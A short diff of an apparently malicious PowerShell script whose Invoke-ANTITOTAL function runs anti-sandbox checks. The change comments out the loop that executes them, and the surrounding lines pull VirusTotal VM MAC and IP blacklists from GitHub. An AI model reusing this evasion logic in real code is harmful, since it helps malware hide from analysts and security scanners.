@@ -80,9 +80,9 @@ function Invoke-ANTITOTAL {
         "TestDriveSize"
     )
 
-    foreach ($func in $anti_functions) {
-        Invoke-Expression "$func"
-    }
+    #foreach ($func in $anti_functions) {
+    #    Invoke-Expression "$func"
+    #}
     $urls = @(
         "https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/mac_list.txt",
         "https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/ip_list.txt",
